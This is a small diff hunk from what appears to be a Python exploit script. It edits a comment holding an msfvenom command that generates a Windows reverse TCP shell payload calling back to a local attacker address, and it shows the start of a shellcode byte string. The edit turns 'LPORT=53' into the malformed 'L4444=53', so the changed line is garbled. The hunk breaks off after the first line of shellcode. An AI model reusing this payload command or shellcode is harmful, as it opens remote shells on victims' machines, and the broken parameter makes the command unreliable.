@@ -3,7 +3,7 @@ import sys
 import socket
 from time import sleep
 
-#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "badchars" -f c
+#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 L4444=53 EXITFUNC=thread -b "badchars" -f c
 
 shellcode = (
 "\xb8\xa9\x8f\x74\x39\xd9\xcf\xd9\x74\x24\xf4\x5f\x31\xc9"
